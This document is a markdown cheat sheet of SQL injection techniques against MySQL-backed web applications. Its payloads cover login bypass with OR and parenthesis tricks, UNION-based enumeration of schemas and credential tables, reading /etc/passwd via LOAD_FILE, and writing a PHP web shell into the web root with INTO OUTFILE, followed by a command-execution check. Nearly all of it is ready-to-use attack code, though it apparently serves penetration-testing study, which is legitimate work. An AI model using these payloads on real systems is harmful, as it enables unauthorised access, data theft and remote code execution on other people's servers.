# SQLI TTP's

## Detection (Identify locations where the user input is not properly sanitized)
Use one or a combination of the below characters or it's URL encoded version and see if the page changes or otherwise errors out.

|Payload|URL Encoded|
|-------|-----------|
|`'`|`%27`|
|`"`|`%22`|
|`#`|`%23`|
|`;`|`%3b`|
|`)`|`%29`|
|`*`|`%2a`|

## Auth Bypass
### `OR` Injection
* Most Important: We always need the query to return true, regardless of the username and password entered
* Critical to this, is the MySQL Operation Precedenct, which states an AND is always evaluated before an OR. This means that if there is at least one true condition along with an OR operator, the condition will evaluate to true. 
Sample Auth SQL Query:
```sql
SELECT * FROM users WHERE username = 'user' AND password = 'pass';
```
If we inject `' OR '1'=1'--`
We would now have:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1'--' AND password = '';
```
Notice the password portion of the query is now commented out, and username always returns true, because 1 always equals 1

The below will always log you in as the first person in the database, usually the admin.
```sql
' or 1=1 limit 1 --
```

Additionally, if you know a username, you can inject the `OR` statement into the password field to log in as that user.

[PayloadsAllTheThings SQLI Auth_Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/Auth_Bypass.txt)

### Parenthetical Evalation
Consider the following SQL froma  login form:
```sql
SELECT * FROM logins WHERE (username=input AND id >1) AND password=input
```
>Note: This is a common way to prevent an admin from logging in, as the id must be greater than 1.

We can bypass this by commenting out and closing the parenthesis

Example 1:  
Username input: `admin')-- -`  
password input: test  
Results in the following query:
```sql
SELECT * FROM logins WHERE (username='admin')-- AND id>1) AND password=test
```
This get's us in because we closed out the parenthisis right after the username and then commented out the rest of the statement.  

Example 2: In this example, we do not know the username, but we are going to use the `id` column to log in as anyone we want.  
Username input: `test' OR id=5)-- `  
Password input: test  
Results in the following query:
```sql
SELECT * FROM logins WHERE (username='test' OR id=5)-- AND password=test
```
This get's us in because we changed the parenthetical `AND` into an `OR` and just entered an arbitrary ID, then commented out the rest of the query.

## Abuse
### With `UNION`
`UNION` statements can only work on select statements with the same number of columns.

### Detecting the Number of Columns with `ORDER BY`
We can use the `ORDER BY` function until we generate an error. 
For Example on a table with 4 columns:
```sql
order by 3--
# Get's us results
```
and then:
```sql
order by 4-- 
# Get's us results
```

and then:
```sql
order by 5--
# Get's us an error
```
Now we know the table has 4 columns

### Detecting the Number of Columns with `UNION`
When using `ORDER BY`, we get results until we hit an error, with `UNION` we get an error until we get results

Example of a table with 4 columns:
```sql
cn' UNION select 1,2,3--
# This will generate an error
```
```sql
cn' UNION select 1,2,3,4-- 
# This gets us results, so we know we have 4 columns
```

### Displayed Columns
Not all columns may be displayed, There's a couple of ways to figure out which columns are displaying data.

We can use numbers:
```sql
test') union select 1,2,3,4-- -
```
Or we can use `@@version` and cycle through our available columns to see which ones actually display the version:
```sql
test') union select 1,@@version,3,4-- -
```

### Concatenation (Useful if we only have 1 column being displayed)
Concatenation enables you combine multipe strings into a single string.
|DBMS|Syntax|
|____|______|
|Oracle|`'foo'||'bar'`|
|MS|`'foot'+'bar'`|
|Postgre|`'foo'||'bar'`|
|MySQL|`'foot' 'bar'` or `CONCAT('foo','bar')`|

### Getting the Database Layout to locate and extract the data.
Finding all of the DB's
```sql
cn' UNION select 1, schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- 
# schema_name is the name of individual databases
```

Finding all the tables.
```sql
cn' UNION select 1, TABLE_NAME, TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='<insert db name here'-- 
# schema_name is the name of the table
```

Getting all of the columns.
```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- 
```

Getting the Data
```sql
test') UNION select 1,2,<column1,column2 from <dbname.table>-- 
```

## Reading Files
> DB User must have `FILE` privilege.

### Find out which user we are:
```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user

# Injection
cn' UNION SELECT 1, user(),3,4--
```

### Find our Priv's
```sql
# SQL
SELECT super_priv FROM mysql.user

# Injection
cn' UNION select 1, super_priv, 3, 4 FROM mysql.user--

# Injection in a DB with alot of users
cn' UNION select 1, super_priv, 3, 4 FROM mysql.user WHERE user='root'--

# Dumping other priv's from schema
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- 

# Dumping all priv's for a user
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM informatiion_schema.user_privileges WHERE grantee="'root'@'localhost'"-- 
```

### `LOAD_FILE`
:warning: WE can only read files if the MySQL user has file system permissions to the file.
```sql
# SQL
SELECT LOAD_FILE('/etc/passwd');

# Injection
cn' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4-- 
```

## Writing Files
### Write File Privileges
1. User with `FILE` privilege enabled
2. MySQL global `secure_file_priv` variable not enabled
3. Write access to the location we want to write to on the back-end server.

### `secure_file_priv`
`secure_file_prive` variable determines where we can read/write files from. If it is not set, we can access the whole file system. If it is set, we can only read/write to that path, if it is `NULL`, we can't read/write to the file system at all.

SQL to enumerate `secure_file_priv`:
```sql
SHOW VARIABLES LIKE 'secure_file_priv'
```
:warning: You can't use this in a `SELECT` statement.

MySQL global variabls are stored in `information_schema.global_variables` that has 2 columns `variable_name` and `variable_value` which we can access. There are alot of variables in this table, so it is best to use a `WHERE` to filter those results.

Example SQL Query:
```sql
SELECT variable_name, variable_value from information_schema.global_variables where variable_name='secure_file_priv';
```

Example injection using our above DB
```sql
cn' UNION select 1, variable_name, variable_value, 4 from information_schema.global_variables where variable_name='secure_file_priv'-- 
```
If the value is empty, then we can read the entire file system, as long as the other conditions are true.

### `SELECT INTO OUTFILE`
We can generally add `INTO OUTFILE ...` to the end of our query to write the results to a file.
SQL Example:
```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
# Dumps the Users table into a file at /tmp/credentials
```
SQL Example of writing arbitrary strings to a file
```sql
select 'this is a test' INTO OUTFILE '/tmp/test.txt';
```
> Tip: Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.   

Injection Example writing 'file written successfully' into file /var/www/html/proof.txt
```sql
cn' union select 1, "file written successfully", 3, 4 into outfile '/var/www/html/proof.txt'-- 
# If no errors on the page, your file probably succeeded
```
> Note: In the above example, you would have a text file that read "1   file written successfully   3   4" because the other columns would be written to the file as well. You can get around this by using quotes instead of numbers in the other columns, such as
```sql
cn' union select "", "file written successfully", "", "" into outfile 'var/www/html/proof.txt'-- 
```

### Writing a web shell
We can use `OUTFILE` to write a webshell to the web directory
ExampLe Shell:
```php
<?php system($_REQUEST[0]); ?>
```
> Note: To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or this [wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.

Example injection to write our shell
```sql
cn' UNION SELECT "", '<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- 
```

Now we can verify by browing to shell.php and using the shell parameter:
```url
http://serverip:port/shell.php?0=id
# The output of `id` confirms our shell is working
```

# Resources
[Portswigger SQLI Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
[PayloadsAllTheThings SQLI Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)  
[PayloadsAllTheThings SQLI Deep Dive](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/)  
[Portswigger SQLI Labs](https://portswigger.net/web-security/all-labs#sql-injection)  

